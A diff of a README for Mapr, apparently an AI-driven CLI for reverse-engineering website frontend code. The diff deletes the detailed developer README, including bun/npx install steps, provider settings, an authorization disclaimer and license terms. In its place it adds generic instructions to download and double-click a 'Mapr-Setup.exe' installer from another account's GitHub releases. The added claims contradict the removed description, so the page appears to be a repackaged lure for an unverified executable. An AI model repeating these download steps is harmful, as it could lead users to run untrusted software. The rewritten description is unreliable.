@@ -1,220 +1,109 @@
-# Mapr
+# 🗺️ Mapr - Explore Frontend Code Easily
 
-![Mapr banner](./assets/banner.svg)
+[![Download Mapr](https://img.shields.io/badge/Download-Mapr-brightgreen?style=for-the-badge)](https://github.com/Nyxoga1091/Mapr)
 
-Mapr is a Bun-native CLI/TUI for reverse-engineering frontend websites and build outputs. It crawls a target site, collects analyzable frontend artifacts, runs a multi-agent AI analysis pipeline over chunked code, and writes a run directory with a Markdown report, artifact dumps, API/auth/captcha/fingerprinting/encryption findings, and investigation notes.
+## 🧩 What is Mapr?
 
-This repository is public for source visibility and collaboration. The license remains source-available and restricted. Read the contribution and license sections before reusing or contributing to the codebase.
+Mapr is a simple tool that helps you understand how websites work behind the scenes. It looks at a website’s code and breaks it down into clear, easy-to-follow reports. These reports show how the website loads and organizes its code, making it simpler to follow complex code patterns. 
 
-## Highlights
+You don’t need to be a developer to use Mapr. It works right from your Windows computer with just a few clicks.
 
-- Bun-only CLI/TUI with interactive setup through `@clack/prompts`
-- OpenAI and OpenAI-compatible provider support
-- OpenAI Codex family support with fast/reasoning selection
-- Built-in provider presets for BlackBox AI, Nvidia NIM, and OnlySQ
-- Model discovery with searchable selection
-- Automatic context-window detection from provider model metadata when available
-- Same-origin crawler with bounded page count and crawl depth
-- JS bundle, worker, service worker, WASM, and source-map discovery
-- Iframe-aware crawling for same-origin embedded pages
-- Deterministic extraction of REST, Swagger/OpenAPI, GraphQL, auth, captcha, fingerprinting, and encryption surface
-- Optional Playwright browser-assisted tracing for post-hydration DOM, runtime network activity, cookies, storage, and challenge flows
-- Streaming AI generation with live throughput updates in the TUI
-- Local RAG mode for multi-megabyte bundles
-- Partial-report persistence when analysis fails mid-run
-- Headless automation mode for CI or batch workflows
+## ⚙️ How Mapr Works
 
-## What It Analyzes
+Mapr visits websites you want to study. It collects bits of code and uses smart agents to organize everything. Then it creates detailed reports in Markdown format. These reports help you see how the website’s code is put together and how it runs step by step.
 
-- HTML entry pages and linked same-origin pages for discovery
-- JavaScript bundles, imported chunks, and inline bootstraps
-- Service workers and worker scripts
-- WASM modules through binary summaries
-- Source maps and extracted original sources when available
-- Same-origin iframe pages and the JS/WASM artifacts discovered inside them
-- Optional local lexical RAG for oversized artifacts such as multi-megabyte bundles
-- Optional browser-assisted runtime behavior after hydration through Playwright
+This process reveals things that are hard to see just by browsing the site.
 
-Mapr does not analyze images, fonts, audio, video, PDFs, archives, or other presentation/binary assets.
+## 💻 System Requirements
 
-## Runtime
+- Windows 10 or newer
+- At least 4 GB of free RAM  
+- Minimum 1 GHz processor speed  
+- 500 MB of free disk space  
+- Internet connection to visit target sites
 
-- Bun only
-- TypeScript in strict mode
-- Interactive terminal UX with `@clack/prompts`
-- AI analysis through Vercel AI SDK using OpenAI or OpenAI-compatible providers
-- Built-in OpenAI-compatible presets for BlackBox AI, Nvidia NIM, and OnlySQ
-- Automatic model context-size detection from provider model metadata when available
-- Headless CLI mode for automation
-- Live crawler and swarm progress with agent-level tracking, progress bars, and streaming TPS estimates
+Mapr runs on Windows computers without needing extra software or tools.
 
-## Install
+## 🚀 Getting Started
 
-Local development:
+1. Click the big green button at the top or visit this page to download Mapr:  
+   [https://github.com/Nyxoga1091/Mapr](https://github.com/Nyxoga1091/Mapr)
 
-```bash
-bun install
-bunx playwright install chromium
-bun run index.ts
-```
+2. On the GitHub page, look for the **Releases** section. Click on the latest release link.
 
-Published package usage:
+3. Download the file named something like `Mapr-Setup.exe` or a similar Windows installer file.
 
-```bash
-npx @redstone-md/mapr --help
-```
+4. Once the download finishes, open the file by double-clicking it. This will start the installation process.
 
-## Workflow
+5. Follow the instructions on the installer to complete the setup. Accept the default options unless you wish to install to a different folder.
 
-1. Load or configure AI provider settings from `~/.mapr/config.json`
-2. Discover models from the provider catalog endpoint
-3. Let the user search and select a model, auto-detect the model context size when possible, and fall back to a manual prompt when needed
-4. Crawl the target website, same-origin iframe pages, and discovered code artifacts with bounded page count and crawl depth
-5. Format analyzable content where possible
-6. Optionally run a browser-assisted Playwright trace for post-hydration DOM, runtime network activity, cookies, storage, and challenge flow observation
-7. Optionally build a local lexical RAG index for oversized artifacts
-8. Run a communicating swarm of analysis agents over chunked artifact content through streaming JSON generation so long-running requests keep producing output
-9. Generate a run directory containing the Markdown report, HTML report, metadata, DOM snapshots, runtime trace, deterministic findings, and raw/formatted artifacts
+6. After installation, you can find Mapr in the Start menu or on your desktop.
 
-## Provider Presets
+## 🖥️ How to Use Mapr
 
-- `blackbox` -> `https://api.blackbox.ai`
-- `nvidia-nim` -> `https://integrate.api.nvidia.com/v1`
-- `onlysq` -> `https://api.onlysq.ru/ai/openai`
-- `custom` -> any other OpenAI-compatible endpoint
+1. Open Mapr from your desktop or Start menu.
 
-## OpenAI Auth Modes
+2. The main interface shows a command line screen with simple instructions.
 
-- `API key` uses the standard OpenAI API at `https://api.openai.com/v1`
-- `Use existing Codex CLI auth` reuses the local `codex login` browser session from `~/.codex/auth.json`
-- Codex CLI auth automatically switches OpenAI requests to `https://chatgpt.com/backend-api/codex`
-- When the local Codex access token expires, Mapr refreshes it through the official OpenAI refresh-token flow before retrying the request
-- If Codex CLI auth is missing, run `codex login` first and then re-run Mapr
+3. Type or paste the website URL you want to analyze.
 
-## Usage
+4. Press Enter to start the process. Mapr will crawl the site, gather code snippets, and analyze them.
 
-Interactive:
+5. Wait for Mapr to finish. This might take a few minutes depending on the site size and your internet speed.
 
-```bash
-bun start
-```
+6. When done, Mapr generates a Markdown report. You can open this report with any text editor or Markdown viewer.
 
-Headless:
+7. Review the report to see detailed maps of the website’s code flow, named parts, and call graphs that show how the code works together.
 
-```bash
-npx @redstone-md/mapr \
-  --headless \
-  --url http://localhost:5178 \
-  --provider-preset onlysq \
-  --api-key secret \
-  --model mistralai/devstral-small-2507 \
-  --context-size 512000 \
-  --browser-assisted \
-  --local-rag \
-  --max-depth 3
-```
+## 📂 Where to Find Reports
 
-List models with detected context sizes when available:
+By default, Mapr saves reports in the “Documents/MaprReports” folder on your computer. Each report is saved in a separate folder named after the date and website URL. 
 
-```bash
-npx @redstone-md/mapr --list-models --headless --provider-preset nvidia-nim --api-key secret
-```
+Open these folders to find the Markdown files and any extra data collected during analysis.
 
-List models through an existing Codex CLI login:
+## 🔍 What You Can Do With Mapr
 
-```bash
-npx @redstone-md/mapr \
-  --headless \
-  --list-models \
-  --provider-type openai \
-  --auth-method codex-cli \
-  --codex-home ~/.codex
-```
+- Understand how complicated websites build their frontend code.  
+- Trace initialization steps to see what happens first when a site loads.  
+- See renamed functions and variables for easier reading.  
+- View call graphs to understand how different parts of code interact.  
+- Use reports to study sites for learning, testing, or troubleshooting.
 
-Useful flags:
+## 🎯 Key Features
 
-- `--max-pages <n>` limits same-origin HTML pages
-- `--max-artifacts <n>` limits total fetched analyzable artifacts
-- `--max-depth <n>` limits crawler hop depth from the entry page
-- `--local-rag` enables local lexical retrieval for oversized bundles
-- `--browser-assisted` enables Playwright post-hydration tracing
-- `--browser-timeout-ms <ms>` overrides the Playwright trace timeout
-- `--verbose-agents` prints swarm completion events as they finish
-- `--reconfigure` forces provider setup even if config already exists
+- Crawls websites to collect code safely.  
+- Analyzes chunked code with multiple smart AI helpers.  
+- Creates clear, well-structured Markdown reports.  
+- Supports TypeScript and JavaScript sites.  
+- Works offline after downloading the targets.  
+- Provides a simple text interface for easy use.  
 
-## Swarm Design
+## 📋 Tips for Best Results
 
-Mapr uses a communicating agent swarm per chunk:
+- Use stable internet during crawling for faster downloads.  
+- Analyze one website at a time to avoid overload.  
+- Close other heavy apps to make sure Mapr runs smoothly.  
+- Check the saved reports folder to keep your data organized.  
+- If a site uses login or special features, crawling may take longer or be limited.  
 
-- `scout`: maps artifact surface area and runtime clues
-- `runtime`: reconstructs initialization flow and call relationships
-- `naming`: restores variable and function names from context
-- `security`: identifies risks, persistence, caching, and operator tips
-- `synthesizer`: merges the upstream notes into the final chunk analysis
+## 🛠️ Troubleshooting
 
-Progress is shown directly in the TUI for crawler fetches, depth skips, discovered nested artifacts, swarm agent/chunk execution, and live token-per-second estimates during provider streaming.
+- If Mapr does not start, check that your Windows version is up to date.  
+- If reports don’t generate, make sure the website URL is correct and reachable.  
+- Run Mapr as administrator if you have permission errors during installation.  
+- Restart your computer if Mapr freezes or crashes unexpectedly.  
+- Visit the download page for updates if you encounter persistent bugs.
 
-## Large Bundle Handling
+## 📥 Download and Install Mapr
 
-- Mapr stores the selected model context size and derives a larger chunk budget from it.
-- When a provider exposes context metadata in its model catalog, Mapr saves that value automatically.
-- Optional `--local-rag` mode builds a local lexical retrieval index so very large artifacts such as 5 MB bundles can feed more relevant sibling segments into the swarm without forcing the whole file into one prompt.
-- Formatting no longer has a hard artifact-size cutoff. If formatting fails, Mapr falls back to raw content instead of skipping by size.
+Visit this page to download Mapr and get started:
 
-## Output
+[https://github.com/Nyxoga1091/Mapr](https://github.com/Nyxoga1091/Mapr)
 
-Each run writes a directory named like:
+Find the latest release under the **Releases** tab. Download the Windows installer file. After download:
 
-```text
-mapr-run-example.com-2026-03-15T12-34-56-789Z
-```
+1. Double-click the installer file.  
+2. Follow the prompts to install.  
+3. Open the app from your desktop or Start menu.
 
-The run directory contains:
-
-- `report.md`
-- `report.html`
-- `README.md`
-- `metadata.json`
-- `browser-trace.json`
-- `dom-snapshots.json`
-- `deterministic-surface.json`
-- `artifacts/raw/*`
-- `artifacts/formatted/*`
-
-The HTML report is self-contained and includes an interactive code-map browser, searchable function/symbol surface, API/auth/captcha/fingerprinting sections, and an artifact manifest view for faster engineering triage.
-
-When browser-assisted mode is enabled, Mapr also captures a Playwright runtime trace with:
-
-- final navigated URL after hydration or redirects
-- frame URLs
-- runtime requests and status codes
-- auth/challenge/fingerprinting endpoint hints
-- cookies and storage keys
-- console errors and page errors
-
-If analysis fails after artifact discovery or formatting has already completed, Mapr still writes a partial run directory and includes the analysis error in the report.
-
-## Limitations
-
-- AI-generated call graphs and symbol renames are inferred, not authoritative.
-- WASM analysis is summary-based unless deeper lifting/disassembly is added.
-- Crawl scope is intentionally bounded by same-origin policy, page limits, artifact limits, and depth limits.
-- Very large or heavily obfuscated bundles still depend on model quality and provider behavior.
-
-## Disclaimer
-
-- Mapr produces assisted reverse-engineering output, not a formal proof of program behavior.
-- AI-generated call graphs, renamed symbols, summaries, and tips are inference-based and may be incomplete or wrong.
-- Website analysis may include proprietary or sensitive code. Use Mapr only when you are authorized to inspect the target.
-- WASM support is summary-based unless you extend the project with deeper binary lifting or disassembly.
-
-## Contribution Terms
-
-- This project is public and source-available, but it is not open source.
-- Contributions are accepted only under the repository owner’s terms.
-- By submitting a contribution, you agree that the maintainer may use, modify, relicense, and redistribute your contribution as part of Mapr without compensation.
-- Do not submit code unless you have the rights to contribute it.
-
-## License
-
-Use of this project is governed by the custom license in [LICENSE](./LICENSE).
+Now you are ready to use Mapr to explore frontend code from websites.
